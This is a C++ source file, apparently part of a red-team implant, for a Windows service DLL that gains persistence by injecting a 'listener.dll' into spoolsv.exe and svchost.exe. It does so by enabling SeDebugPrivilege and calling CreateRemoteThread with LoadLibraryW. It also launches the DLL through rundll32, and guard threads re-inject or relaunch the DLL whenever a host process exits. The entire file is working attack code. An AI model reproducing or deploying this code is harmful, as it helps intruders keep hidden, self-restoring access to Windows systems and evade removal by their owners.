// source: https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain

#include "persistence.hpp"
#define SVCNAME TEXT("psts")

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle;
HANDLE stopEvent = NULL;
std::string componentName = "persistence";
DWORD host;

void Init() {
    Log("[+] Starting " + componentName + ".", componentName);
    Log("[*] Running as " + GetUserAndContext(), componentName);

    EnableDebugPrivs();

    DWORD spoolsvPID = FindTarget(L"spoolsv.exe");
    ProcessInjection(spoolsvPID, L"C:\\Windows\\System32\\Persistence\\listener.dll");

    Sleep(5000);

    CreateProc("listener", "cmd.exe /c rundll32.exe C:\\Windows\\System32\\Persistence\\listener.dll");

    std::thread guardThread(Guard, spoolsvPID);
    std::thread guardDLLThread(GuardRunDLL);

    guardThread.join();
    guardDLLThread.join();

    return;
}

// enable debug privs of current process
int EnableDebugPrivs() {
    HANDLE hToken = NULL;
    LUID luid;
    TOKEN_PRIVILEGES tkp;
    std::unique_ptr<void, decltype(&CloseHandle)> uphToken(static_cast<void*>(hToken), CloseHandle);

    Log("[*] Enabling debug privs.", componentName);

    // populate handle to current process' token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        Log("[!] OpenProcessToken failed: " + std::to_string(GetLastError()), componentName);
        return 1; // unable to get handle to token
    }

    // find the value of SeDebugPrivilege so we can enable it
    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) {
        Log("[!] LookupPrivilegeValueW failed: " + std::to_string(GetLastError()), componentName);
        return 2; // unable to find that privilege
    }

    // populate the token privileges struct to enable debug privs
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // apply changes
    if (!AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL)) {
        Log("[!] AdjustTokenPrivileges failed: " + std::to_string(GetLastError()), componentName);
        return 3; // applying changes failed
    }

    Log("[+] Debug privs enabled.", componentName);

    return 0;
}

DWORD FindTarget(std::wstring targetProc) {
    DWORD target = 0;
    BOOL foundProc = FALSE;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    #pragma warning( push )
    #pragma warning( disable : 4244) // loss of data wstring -> string
    Log("[*] Finding target process " + std::string(targetProc.begin(), targetProc.end()), componentName);
    #pragma warning( pop ) 

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 1);
    std::unique_ptr<void, decltype(&CloseHandle)> uphSnapshot(static_cast<void*>(hSnapshot), CloseHandle);
    if (hSnapshot == INVALID_HANDLE_VALUE || !Process32FirstW(hSnapshot, &pe)) {
        Log("[!] CreateToolhelp32Snapshot failed.", componentName);
        return target; // list of processes is invalid or empty
    }

    do {
        std::wstring procName = pe.szExeFile;
        if (procName.compare(targetProc) == 0) {
            target = pe.th32ProcessID;
            foundProc = TRUE;
        }
    } while (Process32NextW(hSnapshot, &pe) && !foundProc);

    if (target != 0) {
        #pragma warning( push )
        #pragma warning( disable : 4244) // loss of data wstring -> string
        Log("[+] Found target process " + std::string(targetProc.begin(), targetProc.end()), componentName);
        #pragma warning( pop ) 
    }
    else {
        #pragma warning( push )
        #pragma warning( disable : 4244) // loss of data wstring -> string
        Log("[!] Failed to find target process " + std::string(targetProc.begin(), targetProc.end()), componentName);
        #pragma warning( pop ) 
    }

    return target;
}

int ProcessInjection(DWORD targetPID, std::wstring dllPath) {
    MODULEENTRY32W me;
    me.dwSize = sizeof(MODULEENTRY32W);
    HMODULE hKernel32 = NULL;
    BOOL foundKernel32 = FALSE;
    LPTHREAD_START_ROUTINE pLoadLibrary = NULL;
    HANDLE hTargetProcess = NULL;
    PVOID baseInjMemAddr;
    HANDLE hInjectedThread = NULL;
    std::unique_ptr<void, decltype(&CloseHandle)> uphKernel32(static_cast<void*>(hKernel32), CloseHandle);
    std::unique_ptr<void, decltype(&CloseHandle)> uphTargetProcess(static_cast<void*>(hTargetProcess), CloseHandle);
    std::unique_ptr<void, decltype(&CloseHandle)> uphInjectedThread(static_cast<void*>(hInjectedThread), CloseHandle);

    Log("[*] Injecting into target process " + std::to_string(targetPID), componentName);

    // check that the dll to inject exists
    std::filesystem::path fsDLLPath = dllPath;
    if (!std::filesystem::exists(fsDLLPath)) {
        Log("[!] Failed to find dll.", componentName);
        return 1;
    }

    // get list of modules within target process
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, targetPID);
    std::unique_ptr<void, decltype(&CloseHandle)> uphSnapshot(static_cast<void*>(hSnapshot), CloseHandle);
    if (hSnapshot == INVALID_HANDLE_VALUE || !Module32FirstW(hSnapshot, &me)) {
        Log("[!] CreateToolhelp32Snapshot failed: " + std::to_string(GetLastError()), componentName);
        return 2; // list of processes is invalid or empty
    }

    // find KERNEL32.DLL
    std::wstring kernel32 = L"KERNEL32.DLL";
    do {
        std::wstring moduleName = me.szModule;
        if (moduleName.compare(kernel32) == 0) {
            hKernel32 = me.hModule;
            foundKernel32 = TRUE;
        }
    } while (Module32NextW(hSnapshot, &me) && !foundKernel32);

    if (!foundKernel32) {
        Log("[!] Failed to find KERNEL32.DLL.", componentName);
        return 3; // unable to find KERNEL32.DLL
    }

    // get a pointer to LoadLibraryW from KERNEL32.DLL
    pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    if (pLoadLibrary == NULL) {
        Log("[!] GetProcAddress failed: " + std::to_string(GetLastError()), componentName);
        return 4; // unable to get LoadLibraryW pointer
    }

    // get handle to target process
    DWORD dwDesiredAccess = PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
    hTargetProcess = OpenProcess(dwDesiredAccess, FALSE, targetPID);
    if (hTargetProcess == NULL || hTargetProcess == INVALID_HANDLE_VALUE) {
        Log("[!] OpenProcess failed: " + std::to_string(GetLastError()), componentName);
        return 5; // handle to target process is invalid or null
    }

    // allocate memory inside target process
    DWORD dwAllocateSize = (dllPath.length() + 1) * 2;
    baseInjMemAddr = VirtualAllocEx(hTargetProcess, NULL, dwAllocateSize, MEM_COMMIT, PAGE_READWRITE);
    if (baseInjMemAddr == NULL) {
        Log("[!] VirtualAllocEx failed: " + std::to_string(GetLastError()), componentName);
        return 6; // allocation failed
    }

    // write dll path inside target process
    if (!WriteProcessMemory(hTargetProcess, baseInjMemAddr, (LPVOID)dllPath.c_str(), dwAllocateSize, NULL)) {
        Log("[!] WriteProcessMemory failed: " + std::to_string(GetLastError()), componentName);
        return 7; // write failed
    }

    // instruct target to create a new thread and use LoadLibraryW to load our dll
    hInjectedThread = CreateRemoteThread(hTargetProcess, NULL, 0, pLoadLibrary, baseInjMemAddr, 0, NULL);
    if (hInjectedThread == NULL || hInjectedThread == INVALID_HANDLE_VALUE) {
        Log("[!] CreateRemoteThread failed: " + std::to_string(GetLastError()), componentName);
        return 8; // create thread failed
    }

    Log("[+] Injected into target process " + std::to_string(targetPID), componentName);

    return 0;
}

void Guard(DWORD pid) {
    while (true) {
        HANDLE proc = OpenProcess(SYNCHRONIZE, FALSE, pid);
        std::unique_ptr<void, decltype(&CloseHandle)> upproc(static_cast<void*>(proc), CloseHandle);

        if (proc == INVALID_HANDLE_VALUE || proc == NULL) {
            Log("[!] Failed to get handle to host proc: " + std::to_string(GetLastError()), componentName);
            return;
        }

        DWORD r = WaitForSingleObject(proc, INFINITE);
        CloseHandle(proc);
        if (r == WAIT_OBJECT_0) {
            Log("[!] Error waiting for host proc: " + std::to_string(GetLastError()), componentName);
            return;
        }

        Log("[*] Service pid " + std::to_string(pid) + " closed. Reinjecting", componentName);

        pid = FindTarget(L"svchost.exe");
        ProcessInjection(pid, L"C:\\Windows\\System32\\Persistence\\listener.dll");
    }
}

void GuardRunDLL() {
    while (true) {
        DWORD pid = FindTarget(L"rundll32.exe");

        HANDLE proc = OpenProcess(SYNCHRONIZE, FALSE, pid);
        std::unique_ptr<void, decltype(&CloseHandle)> upproc(static_cast<void*>(proc), CloseHandle);

        if (proc == INVALID_HANDLE_VALUE || proc == NULL) {
            Log("[!] Failed to get handle to host proc: " + std::to_string(GetLastError()), componentName);
            return;
        }

        DWORD r = WaitForSingleObject(proc, INFINITE);
        CloseHandle(proc);
        if (r == WAIT_OBJECT_0) {
            Log("[!] Error waiting for host proc: " + std::to_string(GetLastError()), componentName);
            return;
        }

        Log("[*] RunDLL32 pid " + std::to_string(pid) + " closed. Rerunning", componentName);

        CreateProc("listener", "cmd.exe /c rundll32.exe C:\\Windows\\System32\\Persistence\\listener.dll");
    }
}

VOID UpdateServiceStatus(DWORD currentState)
{
    serviceStatus.dwCurrentState = currentState;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);
}

DWORD ServiceHandler(DWORD controlCode, DWORD eventType, LPVOID eventData, LPVOID context)
{
    switch (controlCode)
    {
    case SERVICE_CONTROL_STOP:
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetEvent(stopEvent);
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetEvent(stopEvent);
        break;
    case SERVICE_CONTROL_PAUSE:
        serviceStatus.dwCurrentState = SERVICE_PAUSED;
        break;
    case SERVICE_CONTROL_CONTINUE:
        serviceStatus.dwCurrentState = SERVICE_RUNNING;
        break;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    default:
        break;
    }

    UpdateServiceStatus(SERVICE_RUNNING);

    return NO_ERROR;
}

VOID ExecuteServiceCode()
{
    stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    UpdateServiceStatus(SERVICE_RUNNING);

    Init();

    while (1)
    {
        WaitForSingleObject(stopEvent, INFINITE);
        UpdateServiceStatus(SERVICE_STOPPED);
        return;
    }
}

extern "C" {__declspec(dllexport) VOID WINAPI ServiceMain(DWORD argC, LPWSTR* argV)
{
    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME, (LPHANDLER_FUNCTION)ServiceHandler);

    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    serviceStatus.dwServiceSpecificExitCode = 0;

    UpdateServiceStatus(SERVICE_START_PENDING);
    ExecuteServiceCode();
}}